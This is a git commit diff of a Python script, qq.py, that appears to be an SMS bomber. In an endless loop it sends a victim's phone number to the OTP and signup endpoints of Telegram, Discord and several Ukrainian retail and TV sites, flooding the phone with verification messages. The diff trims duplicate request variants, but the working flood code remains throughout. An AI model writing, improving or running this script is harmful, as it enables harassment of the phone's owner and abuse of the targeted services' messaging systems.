e0769e89896f901a3fc4ab6fd7d72c8ade60b478
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 18:51:18 +0200

    Add files via upload

--- qq.py
+++ qq.py
@@ -19,118 +19,22 @@ while True:
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-     
- try:
-     print('Отправлено')
-     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-     
- try:
-     print('Отправлено')
-     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-     
- try:
-     print('Отправлено')
-     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, json={'phone' :  NUMBER})
- except:
-     print('Не доставлено')
 #Дискорд
  try:
      print('Отправлено')
      response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-     
- try:
-     print('Отправлено')
-     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')	 
-     
+
  try:
      print('Отправлено')
      response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-     
- try:
-     print('Отправлено')
-     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone' :  NUMBER})
- except:
-     print('Не доставлено')
 #megasport.ua
  try:
      print('Отправлено')
-     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-     
- try:
-     print('Отправлено')
-     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-     
- try:
-     print('Отправлено')
      response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-     
- try:
-     print('Отправлено')
-     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone' :  NUMBER})
- except:
-     print('Не доставлено')
- #zolotakoroleva.ua
- try:
-     print('Отправлено')
-     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, json={'phone' :  NUMBER})
- except:
-     print('Не доставлено')
-#mozayka.com.ua
- try:
-     print('Отправлено')
-     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone' :  NUMBER})
  except:
      print('Не доставлено')
 #my.xtra.tv
@@ -139,46 +43,10 @@ while True:
      response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, json={'phone' :  NUMBER})
- except:
-     print('Не доставлено')
 #my.xtra.tv/password
  try:
      print('Отправлено')
      response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, json={'phone' :  NUMBER})
  except:
      print('Не доставлено')
 #multiplex.ua
